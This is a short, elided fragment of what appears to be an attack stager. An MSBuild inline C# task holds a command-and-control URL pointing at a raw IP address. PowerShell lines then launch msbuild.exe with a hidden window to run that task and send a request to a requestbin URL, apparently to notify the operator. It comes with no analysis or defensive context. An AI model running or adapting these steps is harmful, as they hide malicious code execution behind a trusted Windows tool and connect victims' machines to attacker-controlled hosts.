  ...
  <UsingTask
    ...
    <Task>
      ...
      <Code Type="Fragment" Language="cs">
        ...
        string url = "https://69.20.66.235:443";
        string channel = "http";
...
$stream.close()
Start-Process -WindowStyle hidden -FilePath  "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe" -ArgumentList $file
iwr http://requestbin.fullcontact.com/1axou0k1
